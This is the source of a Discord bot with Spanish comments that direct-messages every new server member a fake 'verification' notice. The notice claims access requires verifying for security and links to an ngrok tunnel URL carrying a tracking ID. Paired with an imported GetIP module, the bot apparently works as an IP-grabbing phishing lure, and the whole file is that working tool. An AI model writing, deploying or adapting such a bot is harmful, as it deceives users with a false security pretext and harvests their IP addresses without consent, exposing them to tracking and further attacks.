const { Client, Events } = require("discord.js");
const getIP = require("./src/GetIP.js");
const config = require("../../config.json");
const dbUtils = require("./src/db/dbUtils.js");

// crear un nuevo cliente de discord
const client = new Client({
    intents: 3276799 
});

const numero = Math.floor(Math.random() * 100000);
const ipService = new getIP(numero);


client.on(Events.ClientReady, async () => {
    console.log(`Conectado como ${client.user.username}!`);
});

// ################################################################
// ################################################################
// ################################################################

// cuando un usuario se una al servidor
client.on(Events.GuildMemberAdd, async (miembro) => {
    try {
        await generarMensaje(miembro.user);
    } catch (error) {
        console.log(`No se pudo enviar el mensaje a ${miembro.user.tag}:`, error);
    }
});

client.on(Events.MessageCreate, async (mensaje) => {
    if (mensaje.author.bot) return; 
    if(mensaje.content.toLowerCase() === "!mensaje") {
        try {
            mensaje = await generarMensaje(mensaje.author);
            setTimeout(() => {
                mensaje.delete().catch(console.error);
            }, 10000); // 10000 milisegundos = 10 segundos
        } catch (error) {
            console.log(`No se pudo enviar el mensaje a ${mensaje.author.tag}:`, error);
        }
    }
});

async function generarMensaje(author) {
    var mensajeVerificacion = "Hola, " + author.username + ". Para poder acceder al servidor tienes que verificarte, esto se hace por temas de seguridad y por el bienestar de la comunidad. \n" + await generarEnlaces();
    
    try {
        return await author.send(mensajeVerificacion);
    } catch (error) {
        console.log(`No se pudo enviar el mensaje a ${author.tag}:`, error);
    }
}

async function generarEnlaces() {
    var enlace = "https://7f3d-94-73-40-169.ngrok-free.app/" + numero;
    return enlace;
}


// ################################################################
// ################################################################
// ################################################################

client.login(config.token);